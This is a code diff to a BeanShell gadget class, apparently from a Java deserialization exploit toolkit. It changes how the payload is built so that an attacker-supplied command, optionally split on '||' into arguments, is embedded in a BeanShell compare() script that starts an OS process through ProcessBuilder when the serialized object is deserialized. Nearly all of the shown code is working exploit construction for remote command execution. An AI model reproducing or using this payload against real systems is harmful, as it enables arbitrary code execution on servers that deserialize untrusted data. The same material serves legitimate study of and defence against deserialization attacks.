@@ -21,7 +21,21 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
  
     public PriorityQueue getObject(String command) throws Exception {
 	// BeanShell payload
-	String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";
+		String payload = null;
+		//String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";
+		//String payload = "compare(Object foo, Object bar) {Runtime r = java.lang.Runtime.getRuntime();r.exec(\"" + command + "\");}";
+		if ( command.startsWith("#") ) {
+			final String tcommand = command.substring(1, command.length());
+			final String[] execArgs = tcommand.split("\\|\\|");
+			String tempExecArgsStr = "";
+			for (String arg : execArgs) {
+				tempExecArgsStr += "\"" + arg.replaceAll("\"", "\\\"") + "\",";
+			}
+			final String execArgsStr = "new String[]{" + tempExecArgsStr.substring(0, tempExecArgsStr.length() - 1) + "}";
+			payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(" + execArgsStr + ").start();return new Integer(1);}";
+		} else {
+			payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";
+		}
 
 	// Create Interpreter
 	Interpreter i = new Interpreter();
